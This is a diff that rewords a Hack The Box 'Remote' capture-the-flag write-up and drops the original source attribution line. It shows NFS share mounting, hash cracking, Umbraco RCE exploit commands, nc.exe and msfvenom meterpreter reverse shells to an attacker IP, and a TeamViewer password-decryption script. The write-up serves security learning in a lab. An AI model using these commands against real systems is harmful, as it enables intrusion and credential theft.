@@ -6,12 +6,8 @@ points: 20
 rating: 4.3
 date: 2020-03-21
 avatar: assets/htb/remote.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Remote
 ---
-## Overview
-
-TODO: finish writeup, add images, clean up...wow my notes were bad on this one!
 
 ## Useful Skills and Tools
 
@@ -25,7 +21,7 @@ TODO: finish writeup, add images, clean up...wow my notes were bad on this one!
 
 ### Nmap scan
 
-I started my enumeration of this machine with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` runs a TCP connect scan, `-sV` does a service scan, `-oA <name>` saves all types of output \(`.nmap`,`.gnmap`, and `.xml`\) with filenames of `<name>`.
+I kicked off enumeration with an nmap scan against `<YOUR_IP>`. My usual flags are `-p-` to cover every TCP port, `-sC` for a TCP connect scan, `-sV` for service detection, and `-oA <name>` to write all three output formats \(`.nmap`,`.gnmap`, and `.xml`\) under the chosen `<name>`.
 
 ```text
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-05 09:38 EDT
@@ -85,11 +81,11 @@ Nmap done: 1 IP address (1 host up) scanned in 102.49 seconds
 
 ### Port 21 - FTP
 
-Port 21 for FTP was open so I tried to login  using anonymous access. I was able to connect, but the folder is empty. 
+With FTP open on port 21, I attempted an anonymous login. The connection succeeded, but the directory turned out to be empty. 
 
 ### Port 80 - HTTP
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-http80.png)
+![](assets/wu/remote/img-1.png)
 
 Acme widgets product page
 
@@ -331,29 +327,29 @@ Self-enumerated
 umbraco/create.aspx
 ```
 
-Dirbuster found a huge list of standard Umbraco directories and files, as well as a lot of random product and blog pages.
+Dirbuster turned up a large set of typical Umbraco directories and files, along with plenty of assorted product and blog pages.
 
-A search for Umbraco vulnerabilities led me to [https://www.acunetix.com/vulnerabilities/web/umbraco-cms-remote-code-execution/](https://www.acunetix.com/vulnerabilities/web/umbraco-cms-remote-code-execution/) which described a way to get remote code execution.
+Looking into known Umbraco flaws brought me to [https://www.acunetix.com/vulnerabilities/web/umbraco-cms-remote-code-execution/](https://www.acunetix.com/vulnerabilities/web/umbraco-cms-remote-code-execution/), which detailed a path to remote code execution.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-codeeditor.png)
+![](assets/wu/remote/img-2.png)
 
-This led me to the page  `http://<YOUR_IP>/umbraco/webservices/codeEditorSave.asmx`, which should not exist on the production server.  
+That pointed me at the page `http://<YOUR_IP>/umbraco/webservices/codeEditorSave.asmx`, which has no business existing on a production server.  
 
 [https://blog.gdssecurity.com/labs/2012/7/3/find-bugs-faster-with-a-webmatrix-local-reference-instance.html](https://blog.gdssecurity.com/labs/2012/7/3/find-bugs-faster-with-a-webmatrix-local-reference-instance.html)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-notvulnerable.png)
+![](assets/wu/remote/img-3.png)
 
 rabbit hole?^
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-umbraco.png)
+![](assets/wu/remote/img-4.png)
 
-Navigating to `/umbraco` redirected me to a login page at `http:<YOUR_IP>/umbraco/#/login.asp`.
+Browsing to `/umbraco` bounced me to a login page at `http:<YOUR_IP>/umbraco/#/login.asp`.
 
-After reading through the documentation, I tried the admin password reset found at [https://our.umbraco.com/packages/developer-tools/umbraco-admin-reset/](https://our.umbraco.com/packages/developer-tools/umbraco-admin-reset/) - looked interesting, but didn't work.
+Having gone through the docs, I attempted the admin password reset described at [https://our.umbraco.com/packages/developer-tools/umbraco-admin-reset/](https://our.umbraco.com/packages/developer-tools/umbraco-admin-reset/) - promising, but it didn't pan out.
 
 ### Port 2049 - NFS
 
-since rpc is open and showing mountd service on port 2049: 
+since rpc was open and advertising a mountd service on port 2049: 
 
 * [https://resources.infosecinstitute.com/exploiting-nfs-share](https://resources.infosecinstitute.com/exploiting-nfs-share)
 
@@ -366,7 +362,7 @@ kac0@kali:~/htb/remote$ mkdir /tmp/remote
 kac0@kali:~/htb/remote$ sudo mount -t nfs <YOUR_IP>:/site_backups /tmp/remote
 ```
 
-Using the `showmount -e` command I was able to export the folders that were available to connect to, and list who could connect.  This share was available for everyone.  I obliged myself to the open share and mounted it to a local folder using the `mount` command.
+The `showmount -e` command listed the exported folders along with who was permitted to connect.  This share was open to everyone, so I took advantage of it and mounted it to a local folder with the `mount` command.
 
 ```text
 kac0@kali:~$ cd /tmp/remote
@@ -401,17 +397,17 @@ drwx------  2 nobody 4294967294  4096 Feb 20 12:16 Views
 -rwx------  1 nobody 4294967294 28539 Feb 20 00:57 Web.config
 ```
 
-After mounting the folder locally I was able to browse through the files at my leisure.  This seemed to be a backup of the files for the website that was hosted on port 80.  The file `Web.config` had a line that told me the version number, but there were so many files that I started searching the web to see if I could find out if there were any useful files here.
+With the folder mounted locally, I could explore the files freely.  It looked like a backup of the site served on port 80.  A line in `Web.config` revealed the version number, but with so many files present I turned to the web to figure out which ones might be worth examining.
 
 * [https://our.umbraco.com/forum/developers/api-questions/8905-Where-does-Umbraco-store-data](https://our.umbraco.com/forum/developers/api-questions/8905-Where-does-Umbraco-store-data)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-umbraco-sdf.png)
+![](assets/wu/remote/img-5.png)
 
-In the `App_Data/` folder there was supposed to be a `.sdf` file it seemed.
+It appeared that a `.sdf` file was expected to live in the `App_Data/` folder.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-creds.png)
+![](assets/wu/remote/img-6.png)
 
-There was indeed a `.sdf` file, creatively named: `umbraco.sdf`.  This was a "standard database format" file, but I was still able to extract the data I needed using `vim`.  There was information for a few different users, including email addresses and password hashes.  I extracted the password hashes and sent them to hashcat for cracking.  
+Sure enough, there was a `.sdf` file with the inventive name `umbraco.sdf`.  Although it was a "standard database format" file, I could still pull the data I wanted out of it with `vim`.  It held details for several users, including email addresses and password hashes.  I pulled the password hashes and fed them to hashcat to crack.  
 
 ```text
 kac0@kali:~/htb/remote$ hashcat -O -D1,2 -a0 -m100 hashes /usr/share/wordlists/rockyou.txt
@@ -465,17 +461,17 @@ Started: Sun Feb 21 18:56:47 2021
 Stopped: Sun Feb 21 18:57:12 2021
 ```
 
-The hash `b8be16afba8c314ad33d812f22a04991b90e2aaa` for the `admin` user cracked with the password `baconandcheese`.  
+The `admin` user's hash `b8be16afba8c314ad33d812f22a04991b90e2aaa` cracked to the password `baconandcheese`.  
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-friendly-cms.png)
+![](assets/wu/remote/img-7.png)
 
 after logging in
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-user-cleanup.png)
+![](assets/wu/remote/img-8.png)
 
-Lots of people were using this portal to try to gain access or run enumeration files it seemed. 
+It looked like many others had been using this portal to try gaining access or running enumeration files. 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-ssmith.png)
+![](assets/wu/remote/img-9.png)
 
 ### Umbraco 7.12.4 Remote Code Exploit
 
@@ -559,7 +555,7 @@ kac0@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese 
 iis apppool\defaultapppool
 ```
 
-it worked. now it was time to enumerate the system \(very slow however\)
+it worked. now it was time to enumerate the system \(though it was very slow\)
 
 ```text
 kac0@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese -i http://<YOUR_IP> -c powershell.exe -a '-NoProfile -Command ls'
@@ -620,7 +616,7 @@ Serving HTTP on 0.0.0.0 port 8090 ...
 <YOUR_IP> - - [05/Jul/2020 20:28:42] "GET /nc32.exe HTTP/1.1" 200 -
 ```
 
-once nc.exe was on the box could now get a shell with:
+with nc.exe now on the box, I could grab a shell using:
 
 ```text
 kac0@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese -i http://<YOUR_IP> -c powershell.exe -a 'C:\\Windows\\Temp\\n.exe 10.10.15.82 9990 -e powershell.exe'
@@ -671,11 +667,11 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 ERROR: Unable to get user claims information.
 ```
 
-not much to work with, though some of the Privileges sounded interesting.
+not a lot here, but a couple of the Privileges caught my eye.
 
 ### User.txt
 
-didnt realize for a long time that I already was logged in as a user with access to the flag; I had to hunt for the flag which was in the `Public` user folder `C:\Users\Public`
+it took me a while to notice I was already running as a user with access to the flag; I had to go looking for it, and it sat in the `Public` user folder `C:\Users\Public`
 
 ```text
 PS C:\Users\Public> type user.txt
@@ -694,7 +690,7 @@ Platform ServicePack Version      VersionString
  Win32NT             10.0.17763.0 Microsoft Windows NT 10.0.17763.0
 ```
 
-32bit windows 10 teamviewer 7 installed, searching for exploit leads to [https://whynotsecurity.com/blog/teamviewer/](https://whynotsecurity.com/blog/teamviewer/), there author has a python exploit, ~~need to compile to exe~~ search manually in registry with powershell: [https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-itemproperty?view=powershell-7](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-itemproperty?view=powershell-7)
+32bit windows 10 with teamviewer 7 installed; hunting for an exploit pointed me to [https://whynotsecurity.com/blog/teamviewer/](https://whynotsecurity.com/blog/teamviewer/), there author has a python exploit, ~~need to compile to exe~~ search manually in registry with powershell: [https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-itemproperty?view=powershell-7](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-itemproperty?view=powershell-7)
 
 ```text
 PS C:\Windows\Temp> Get-ItemProperty -Path HKLM:\SOFTWARE\WOW6432Node\Teamviewer\Version7 
@@ -728,7 +724,7 @@ PSDrive                   : HKLM
 PSProvider                : Microsoft.PowerShell.Core\Registry
 ```
 
-Got tv info stored in registry, including the Management password
+Pulled the teamviewer info from the registry, including the Management password
 
 ```python
 import sys, hexdump, binascii
@@ -756,7 +752,7 @@ password = raw_un.decode('utf-16')
 print(password)
 ```
 
-using the python exploit to decrypt the password stored in the reg key I found
+using the python exploit to decrypt the password held in the registry key, I got
 
 ```text
 kac0@kali:~/htb/remote$ python3 teamviewer-pass.py 
@@ -766,11 +762,11 @@ None
 r3m0te_L0gin
 ```
 
-This password didn't seem to do me any good. During research found a post exploit metasploit module that says it will find tv pass, I wanted to see if it was the same one. [https://www.rapid7.com/db/modules/post/windows/gather/credentials/teamviewer\_passwords](https://www.rapid7.com/db/modules/post/windows/gather/credentials/teamviewer_passwords) [https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/gather/credentials/teamviewer\_passwords.md](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/gather/credentials/teamviewer_passwords.md)
+This password didn't get me anywhere. While digging around I came across a post-exploitation metasploit module claiming to recover the teamviewer password, and I wanted to check whether it returned the same one. [https://www.rapid7.com/db/modules/post/windows/gather/credentials/teamviewer\_passwords](https://www.rapid7.com/db/modules/post/windows/gather/credentials/teamviewer_passwords) [https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/gather/credentials/teamviewer\_passwords.md](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/gather/credentials/teamviewer_passwords.md)
 
 > Any Windows host with a `meterpreter` session and `TeamViewer 7+` installed.
 
-So I will need a meterpreter session
+So I'd need a meterpreter session
 
 ### Getting a shell
 
@@ -778,7 +774,7 @@ So I will need a meterpreter session
 kac0@kali:~$ msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.10.15.82 LPORT=4444 -f exe -o rev.exe
 ```
 
-sending msfvenom payload to remote system
+delivering the msfvenom payload to the remote system
 
 ```text
 python3 exploit.py -u admin@htb.local -p baconandcheese -i http://<YOUR_IP> -c powershell.exe -a 'C:\\Windows\\Temp\\r.exe'
@@ -812,7 +808,7 @@ meterpreter > run post/windows/gather/credentials/teamviewer_passwords
 [-] Unable to find TeamViewer's process
 ```
 
-!R3m0te! from meterpreter, different than before...maybe this one works to log in.
+!R3m0te! came out of meterpreter, different from the earlier one...perhaps this one would let me log in.
 
 ### Root.txt
 
